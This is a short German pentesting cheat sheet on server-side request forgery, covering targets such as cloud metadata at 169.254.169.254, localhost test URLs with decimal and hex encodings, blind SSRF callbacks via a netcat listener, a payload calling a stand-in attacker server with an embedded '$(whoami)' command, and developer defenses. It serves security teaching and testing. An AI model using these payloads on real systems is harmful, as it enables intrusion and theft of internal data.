Inhalt für web-pentesting/ssrf.md

# 🌐 Server Side Request Forgery (SSRF)

SSRF ist eine Schwachstelle, bei der ein Angreifer den Server dazu bringt, HTTP-Anfragen zu beliebigen Zielen zu senden – z. B. interne IPs, lokale Dienste oder sogar sich selbst.

---

## 🧠 Was passiert?

Der Angreifer manipuliert eine URL-Eingabe (z. B. für ein Bild), sodass der Server intern Verbindungen herstellt – z. B.:

```http
POST /fetch?url=http://evil.com

Manipuliert zu:

POST /fetch?url=http://127.0.0.1:80

🎯 Ziele von SSRF

    Zugriff auf interne Server oder Cloud-Metadaten (169.254.169.254)

    Port-Scanning

    Zugriff auf lokale Admin-Panels

    Auslesen von Daten (Blind SSRF → über Zeit/Verhalten)

🔍 Test-URLs

http://127.0.0.1/
http://localhost/
http://169.254.169.254/latest/meta-data
http://[::1]/

Alternative Encodings:

http://127.0.0.1
http://2130706433        ← Dezimal
http://0x7f000001        ← Hex

🧪 Blind SSRF

Keine direkte Rückmeldung? → Callbacks erzeugen über:

    Burp Collaborator

    Webhook.site

    Eigener Server: nc -lnvp 80

Payloads:

http://yourcollaborator.com
http://yourserver.com/$(whoami)

🧰 Tools
Tool	Funktion
Burp Suite	Parameter testen, Repeater
Collaborator	Blind SSRF erkennen
SSRFmap	Automatisiertes Testen (Python)
HTTPX	Scanner, DNS-Tools
🛡️ Schutzmaßnahmen (für Entwickler)

    Whitelisting von erlaubten Domains/IPs

    DNS-Auflösung & IP-Validierung

    Keine Weiterleitungen zu internen Ressourcen erlauben

    Outbound-HTTP-Verbindungen strikt einschränken
